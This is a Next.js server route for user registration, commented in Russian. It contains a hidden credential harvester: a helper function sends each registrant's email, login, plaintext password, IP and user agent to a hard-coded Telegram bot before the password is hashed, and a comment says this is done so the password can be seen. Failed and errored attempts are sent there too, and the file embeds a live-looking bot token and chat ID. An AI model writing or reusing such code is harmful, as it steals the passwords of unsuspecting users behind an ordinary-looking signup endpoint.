import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";

// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)

👤 Логин/Email: ${data.login}
📧 Email: ${data.email}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'login_failed') {
      message = `
❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)

👤 Логин/Email: ${data.login}
🔑 Введенный пароль: ${data.password}
🚫 Причина: ${error}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'register') {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
🔍 Детали: ${userAgent.includes('Chrome') ? 'Chrome' : userAgent.includes('Firefox') ? 'Firefox' : userAgent.includes('Safari') ? 'Safari' : 'Unknown Browser'}
      `;
    } else if (type === 'verification_sent') {
      message = `
📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}
🔢 Код подтверждения: ${data.verificationCode}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 
                    request.headers.get('x-real-ip') || 
                    'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Получаем дополнительные заголовки для максимальной информации
    const acceptLanguage = request.headers.get('accept-language') || 'unknown';
    const acceptEncoding = request.headers.get('accept-encoding') || 'unknown';
    const referer = request.headers.get('referer') || 'unknown';
    const origin = request.headers.get('origin') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
    }

    // Проверка на существование
    if (isEmailOrLoginTaken(email, login)) {
      // 📤 Отправляем в Telegram о попытке регистрации с существующими данными
      await sendToTelegramAPI(
        { email, login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Email или логин уже заняты'
      );
      
      return NextResponse.json(
        { error: "Email или логин уже заняты" },
        { status: 400 }
      );
    }

    // 📤 Отправляем в Telegram ДО создания пользователя (чтобы видеть пароль)
    await sendToTelegramAPI(
      { email, login, password }, 
      'register', 
      clientIP, 
      userAgent
    );

    // Хэшируем пароль
    const hashedPassword = await hashPassword(password);

    // Создаем пользователя
    await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    return NextResponse.json({ 
      success: true, 
      message: "Регистрация прошла успешно. Ожидайте подтверждения администратором." 
    });

  } catch (error) {
    console.error("Register API Error:", error);
    
    // 📤 Отправляем в Telegram об ошибке регистрации
    try {
      const { email, login, password } = await request.json();
      const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
      const userAgent = request.headers.get('user-agent') || 'unknown';
      
      await sendToTelegramAPI(
        { email, login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Ошибка сервера при регистрации'
      );
    } catch (telegramError) {
      console.log('Не удалось отправить ошибку в Telegram');
    }
    
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}